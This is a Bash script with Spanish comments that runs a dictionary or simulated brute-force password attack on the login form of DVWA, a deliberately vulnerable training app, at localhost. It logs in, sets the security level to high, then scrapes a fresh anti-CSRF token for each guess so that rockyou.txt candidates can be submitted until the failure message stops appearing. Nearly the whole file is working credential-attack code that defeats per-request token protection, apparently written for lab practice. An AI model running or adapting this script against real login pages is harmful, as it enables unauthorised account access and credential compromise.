#!/bin/bash

# ========================
# PARÁMETROS DESDE CONSOLA
# ========================

# Valores por defecto
WORDLIST="$HOME/rockyou.txt"
USERNAME="admin"
PASSWORD="password"
MODE="dictionary"

# === COLORES ANSI (resaltantes) ===
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
MAGENTA='\033[1;95m'
CYAN='\033[1;96m'
BOLD='\033[1m'
NC='\033[0m' # No Color


echo "========================"
echo " DVWA PASSWORD ATTACKS  "
echo "========================"
echo ""

# Ayuda
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
  echo "Uso: $0 [-d diccionario] [-u usuario] [-p contraseña] [-m modo]"
  echo "Modo: dictionary (default) | brute"
  echo "Ejemplo: $0 -m brute -u admin -p password"
  exit 0
fi

# Parseo de argumentos
while getopts ":d:u:p:m:" opt; do
  case $opt in
    d) WORDLIST="$OPTARG" ;;
    u) USERNAME="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    \?) echo "❌ Opción inválida: -$OPTARG" >&2; exit 1 ;;
    :) echo "❗ Falta el valor para -$OPTARG" >&2; exit 1 ;;
  esac
done

# ========================
# CONFIGURACIÓN GENERAL
# ========================

URL="http://localhost/dvwa"
LOGIN_URL="$URL/login.php"
BRUTE_URL="$URL/vulnerabilities/brute/"
SECURITY_URL="$URL/security.php"

COOKIE_FILE="cookies.txt"

mkdir -p html_debug

# ========================
# PASO 1: LOGIN CON TOKEN
# ========================

echo "[*] Obteniendo token de login..."

LOGIN_FORM=$(curl -s -c $COOKIE_FILE "$LOGIN_URL")
echo "$LOGIN_FORM" > html_debug/login_form.html

LOGIN_TOKEN=$(echo "$LOGIN_FORM" | grep -i 'user_token' | sed -E "s/.*value=['\"]([^'\"]+)['\"].*/\1/")

if [[ -z "$LOGIN_TOKEN" ]]; then
    echo -e "${RED}[!] No se pudo obtener el user_token del login.${NC}"
    exit 1
fi

echo "[*] TOKEN LOGIN -> $LOGIN_TOKEN"

curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
  -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$LOGIN_TOKEN" \
  $LOGIN_URL > html_debug/login_response.html

if grep -q "Login failed" html_debug/login_response.html; then
    echo -e "${RED}[!] Falló el login. Verifica credenciales o token.${NC}"
    exit 1
fi

echo -e "${GREEN}[*] Sesión iniciada correctamente.${NC} Cookies guardadas en $COOKIE_FILE"

# ========================
# PASO 2: CONFIGURAR HIGH
# ========================

echo "[*] Configurando DVWA Security Level en HIGH..."

curl -s -b $COOKIE_FILE -c $COOKIE_FILE \
  -d "security=high&seclev_submit=Submit" \
  "$SECURITY_URL" > html_debug/security_response.html

if ! grep -q "security.*high" $COOKIE_FILE; then
    echo -e "${RED}[!] No se pudo establecer el nivel de seguridad en high.${NC}"
    exit 1
fi

echo -e "${GREEN}[*] Nivel de seguridad configurado en HIGH correctamente.${NC}"

# ========================
# PASO 3: DEFINIR FUENTE DE CONTRASEÑAS
# ========================

if [[ "$MODE" == "dictionary" ]]; then
  echo -e "${BLUE}[*]${NC} Modo de ataque: diccionario"
  PASSWORD_SOURCE=$(cat "$WORDLIST")
elif [[ "$MODE" == "brute" ]]; then
  echo -e "${MAGENTA}[*]${NC} Modo de ataque: fuerza bruta simulada (construyendo 'password')"
  TARGET="password"
  PASSWORD_SOURCE=""
  CURRENT=""
  for ((i=1; i<=${#TARGET}; i++)); do
    CURRENT="${TARGET:0:$i}"
    PASSWORD_SOURCE+="$CURRENT"$'\n'
  done
else
  echo "❌ Modo inválido. Usa: dictionary | brute"
  exit 1
fi

# ========================
# PASO 4: ATAQUE
# ========================

echo "$PASSWORD_SOURCE" | while read -r pwd; do
    echo "[*] Probando password: $pwd"

    FORM_HTML=$(curl -s -b $COOKIE_FILE "$BRUTE_URL")
    echo "$FORM_HTML" > html_debug/form_token_debug_$pwd.html

    if echo "$FORM_HTML" | grep -qi "you must be logged in"; then
        echo -e "${YELLOW}[!]${NC} Sesión expirada. Abortando."
        exit 1
    fi

    TOKEN=$(echo "$FORM_HTML" | grep -i 'user_token' | sed -E "s/.*value=['\"]([^'\"]+)['\"].*/\1/")

    if [[ -z "$TOKEN" ]]; then
        echo "${YELLOW} [!] No se pudo extraer el token${NC}. Abortando..."
        exit 1
    fi

    echo "    TOKEN ACTUAL -> $TOKEN"

    RESPONSE=$(curl -s -L -b $COOKIE_FILE \
      -G "$BRUTE_URL" \
      --data-urlencode "username=$USERNAME" \
      --data-urlencode "password=$pwd" \
      --data-urlencode "Login=Login" \
      --data-urlencode "user_token=$TOKEN")

    echo "$RESPONSE" > html_debug/response_$pwd.html

    if ! echo "$RESPONSE" | grep -q "Username and/or password incorrect."; then
        echo -e "${GREEN}[+] Contraseña encontrada: $pwd ${NC}"
        echo "$RESPONSE" > html_debug/login_exitoso_$pwd.html
        break
    fi

done

